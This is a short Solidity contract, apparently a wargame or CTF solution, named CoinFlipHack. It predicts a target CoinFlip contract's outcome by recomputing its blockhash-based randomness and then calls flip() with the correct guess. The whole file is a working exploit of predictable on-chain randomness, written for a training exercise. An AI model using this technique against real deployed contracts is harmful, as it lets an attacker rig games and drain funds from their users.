// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipHack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlipAddr = 0x18e8659E7e0d94468915C92194f9038989912497;
    CoinFlip public originalContract = CoinFlip(coinFlipAddr);

    function doGuess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 guess = blockValue / FACTOR;
        originalContract.flip(guess != 0);
    }
}